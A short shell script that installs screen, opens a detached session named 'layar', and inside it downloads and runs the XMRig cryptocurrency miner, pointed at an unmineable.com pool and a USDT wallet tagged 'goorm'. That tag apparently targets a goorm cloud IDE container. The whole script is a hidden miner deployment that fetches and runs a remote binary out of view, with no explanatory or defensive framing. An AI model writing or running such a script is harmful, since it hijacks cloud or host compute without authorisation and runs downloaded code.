#!/bin/sh

cd
apt-get install -y screen < "/dev/null"
mkdir yoho
cd yoho

screen -S "layar" -d -m
screen -r "layar" -X stuff $'wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz && tar -xf xmrig-6.15.0-linux-x64.tar.gz && cd xmrig-6.15.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u USDT:0x6172c0d0139e0ce7431cabceae0f59cd49422166.goorm -p x'
